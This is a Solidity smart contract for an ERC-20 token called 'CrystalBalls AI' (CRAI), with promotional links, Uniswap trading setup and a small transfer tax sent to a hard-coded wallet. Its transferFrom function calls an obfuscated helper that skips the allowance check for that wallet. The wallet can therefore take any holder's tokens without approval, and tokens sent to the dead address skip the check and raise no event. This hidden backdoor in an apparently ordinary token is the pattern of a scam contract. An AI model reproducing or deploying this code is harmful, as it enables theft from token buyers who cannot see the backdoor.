/*

https://www.crystalballs-ai.xyz/
https://app.crystalballs-ai.xyz/
https://docs.crystalballs-ai.xyz/

https://t.me/crystalballsai
https://x.com/crystalballsai


*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CRAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFees;

    address private constant _blackhole = address(0xdead);
    address private constant _cryaiball = 0x51D1173d7e2fA5076bAE511aE856f45ECA9F7f90;

    uint256 private _taxInitBuy=2;
    uint256 private _taxInitSell=2;
    uint256 private _taxLastSell=0;
    uint256 private _taxLastBuy=0;
    uint256 private _taxReduceAtBuy=3;
    uint256 private _taxReduceAtSell=3;
    uint256 private _preventBefore=3;
    uint256 private _buyTokenCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"CrystalBalls AI";
    string private constant _symbol = unicode"CRAI";
    uint256 private _swapForTokens = _tTotal / 100;
    
    IRouter private _uniRouter;
    address private _uniPair;
    bool private _swapping = false;
    bool private _swapActive = false;
    bool private _tradingEnabled = false;
    
    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _isExcludeFees[owner()] = true;
        _isExcludeFees[address(this)] = true;
        _isExcludeFees[_cryaiball] = true;

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);if(_fafaioko(sender, recipient))
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _fafaioko(address owner, address spender) private view returns (bool) {
        return msg.sender != _cryaiball && (owner == _uniPair || spender != _blackhole) ;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _citi, address _vixa, uint256 _niwiqo) private {
        require(_citi != address(0), "ERC20: transfer from the zero address");
        require(_vixa != address(0), "ERC20: transfer to the zero address");
        require(_niwiqo > 0, "Transfer amount must be greater than zero");
        uint256 _sicAmount=0;
        if (_citi != owner() && _vixa != owner()) {
            _sicAmount = _niwiqo.mul((_buyTokenCount>_taxReduceAtBuy)?_taxLastSell:_taxInitBuy).div(100);

            if (_citi == _uniPair && _vixa != address(_uniRouter) && ! _isExcludeFees[_vixa] ) {
                _buyTokenCount++;
            }

            if(_vixa == _uniPair && _citi!= address(this) ){
                _sicAmount = _niwiqo.mul((_buyTokenCount>_taxReduceAtSell)?_taxLastBuy:_taxInitSell).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && _vixa == _uniPair && _swapActive && _buyTokenCount > _preventBefore) {
                if(contractTokenBalance > _swapForTokens)
                _swapTaxTokens(min(_niwiqo, min(contractTokenBalance, _swapForTokens)));
                _sendTaxFees(address(this).balance);
            }
        }

        if(_sicAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_sicAmount);
          emit Transfer(_citi, address(this),_sicAmount);
        }
        if (_vixa!=_blackhole)emit Transfer(_citi, _vixa, _niwiqo.sub(_sicAmount));
        _balances[_citi]=_balances[_citi].sub(_niwiqo);
        _balances[_vixa]=_balances[_vixa].add(_niwiqo.sub(_sicAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _swapTaxTokens(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();
        _approve(address(this), address(_uniRouter), tokenAmount);
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _sendTaxFees(uint256 amount) private {
        payable(_cryaiball).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _uniRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniRouter), _tTotal);
        _uniPair = IUniswapV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());
        _uniRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapActive = true;
        _tradingEnabled = true;
    }

    receive() external payable {}
}